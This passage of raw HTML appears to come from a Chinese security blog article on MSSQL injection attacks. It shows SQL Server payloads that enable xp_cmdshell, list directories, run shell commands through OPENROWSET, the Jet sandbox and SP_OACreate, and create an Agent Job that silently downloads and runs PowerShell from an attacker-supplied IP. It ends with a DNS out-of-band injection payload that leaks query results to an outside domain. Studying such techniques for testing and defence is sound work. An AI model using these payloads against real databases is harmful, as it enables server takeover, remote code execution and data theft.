auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs ruby" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">执行<span class="hljs-symbol" style="font-size:14px;line-height:34px;;color: rgb(153, 0, 115);">:EXEC</span>&nbsp;sp_configure&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'show&nbsp;advanced&nbsp;options'</span>,&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>;RECONFIGURE;EXEC&nbsp;sp_configure&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'xp_cmdshell'</span>,&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>;RECONFIGURE;</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">xp_dirtree</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">获取文件信息,可以列举出目录下所有的文件与文件夹</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">参数说明:目录名,目录深度,是否显示文件&nbsp;</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">execute</span>&nbsp;master..xp_dirtree&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'c:'</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">execute</span>&nbsp;master..xp_dirtree&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'c:'</span>,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">execute</span>&nbsp;master..xp_dirtree&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'c:'</span>,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">OPENROWSET</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">OPENROWSET 在MSSQL 2005及以上版本中默认是禁用的.需要先打开:</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">打开语句:</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.24193548387096775" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/9_NAUgzHlR5kyNq8KXysria28z3ibEKQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DecvzCnUydVUIcrnv97MSFUibEDn3NAUgzHlR5kyNq8KXysria28z3ibEKQ/640?wx_fmt=png'" data-type="png" data-w="806" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t017d294870fc9b1ee5.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">然后执行:</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;*&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;OPENROWSET(<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'SQLOLEDB'</span>,&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'数据库地址'</span>;'数据库用户名';'数据库密码',&nbsp;'<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SET</span>&nbsp;FMTONLY&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">OFF</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">execute</span>&nbsp;master..xp_cmdshell&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"dir"');</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">这种攻击是需要首先知道用户密码的.</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">沙盒</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">开启沙盒：</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs cs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">exec&nbsp;master..xp_regwrite&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'SOFTWAREMicrosoftJet4.0Engines'</span>,<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'SandBoxMode'</span>,<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'REG_DWORD'</span>,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>执行命令:<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">select</span>&nbsp;*&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">from</span>&nbsp;<span class="hljs-title" style="font-size:14px;line-height:34px;;color: rgb(153, 0, 0);font-weight: bold;">openrowset</span>(<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'microsoft.jet.oledb.4.0'</span>,<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">';database=c:windowssystem32iasdnary.mdb'</span>,<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'select&nbsp;shell("whoami")'</span>)</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">SP_OACREATE</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">其实xp_cmdshell一般会删除掉了,如果xp_cmdshell 删除以后，可以使用SP_OACreate</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">需要注意的是这个组件是无回显的,你可以把他直接输出到web目录下的文件然后读取</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.2422360248447205" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/10_zzOZ9FCvicZh7O0YCH0olDVyF4aYTg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99Der0ZDLmUntzGEjCJV8R0joXIqTzzOZ9FCvicZh7O0YCH0olDVyF4aYTg/640?wx_fmt=png'" data-type="png" data-w="805" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t01d9ee1236a3ab7c15.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">下面是收集来的sp_OACreate的一些命令:</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.5048231511254019" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/11_YtuiaGcQxtZkH0v3OxicoW89IPlnLw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DeejMMFoMRjf7h08ICJQ0beW0XciaYtuiaGcQxtZkH0v3OxicoW89IPlnLw/640?wx_fmt=png'" data-type="png" data-w="933" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t0180562277c4992f61.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">Agent Job</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">关于Agent job执行命令的这种情况是需要开启了MSSQL Agent Job服务才能执行,这里列出命令,具体的原理在安全客已经有过总结</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">USE</span>&nbsp;msdb;<span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">EXEC</span>&nbsp;dbo.sp_add_job&nbsp;<span class="hljs-variable" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">@job_name</span>&nbsp;=&nbsp;N<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'clay_powershell_job1'</span>&nbsp;;&nbsp;<span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">EXEC</span>&nbsp;sp_add_jobstep&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">@job_name</span>&nbsp;=&nbsp;N<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'clay_powershell_job1'</span>,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">@step_name</span>&nbsp;=&nbsp;N<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'clay_powershell_name1'</span>,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">@subsystem</span>&nbsp;=&nbsp;N<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'PowerShell'</span>,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">@command</span>&nbsp;=&nbsp;N<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'powershell.exe&nbsp;-nop&nbsp;-w&nbsp;hidden&nbsp;-c&nbsp;"IEX&nbsp;((new-object&nbsp;net.webclient).downloadstring(''http://Your_IP/Your_file''))"'</span>,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">@retry_attempts</span>&nbsp;=&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">@retry_interval</span>&nbsp;=&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">5</span>;<span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">EXEC</span>&nbsp;dbo.sp_add_jobserver&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">@job_name</span>&nbsp;=&nbsp;N<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'clay_powershell_job1'</span>;&nbsp;<span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">EXEC</span>&nbsp;dbo.sp_start_job&nbsp;N<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'clay_powershell_job1'</span>;</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">Else</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">MSSQL还有其他的很多存储过程可以调用,下面做一个小列举,有兴趣的朋友可以逐一研究:</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.6194029850746269" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/12_7T4oCCN42aSfBM9otqiarCr2ibTZcQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99Demm4rGicBMNANXD2j06gucTDtyk57T4oCCN42aSfBM9otqiarCr2ibTZcQ/640?wx_fmt=png'" data-type="png" data-w="804" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t01059edc25cf55f5a7.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">下面是关于一些存储过程调用的例子:</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.9900552486187846" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/13_aaUnQKAUx97ojbKNBgE9Eia4W3galA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DePGjwcEedmH4yiaP2tUqkfbaKLCiaaUnQKAUx97ojbKNBgE9Eia4W3galA/640?wx_fmt=png'" data-type="png" data-w="905" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t0124cc15d9b7406c31.png"  /><span style="font-weight: bolder;">Out-of-Band</span></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">关于带外注入在上一篇文章已经有讲到,但DNS注入只讲了利用,这里做了一张图为大家讲解,同样的SMB Relay Attack 也是存在的,可自行实现.</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">下图就是DNS注入中的请求过程</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.6248399487836107" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/14_BH3Phd1Zx0PiaF5uian8njUkxazwIQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DeibVs8aewcvuY4Kj6jOic8V194WibzBH3Phd1Zx0PiaF5uian8njUkxazwIQ/640?wx_fmt=png'" data-type="png" data-w="781" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t0137034ded1ff8ab25.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">那么SQL Server的DNS注入和MySQl稍有不容,但都是利用了SMB协议</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">Param=1;&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;*&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;OPENROWSET(<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'SQLOLEDB'</span>,&nbsp;({INJECT})+<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'.rootclay.club'</span>;'sa';'pwd',&nbsp;'<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span><span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 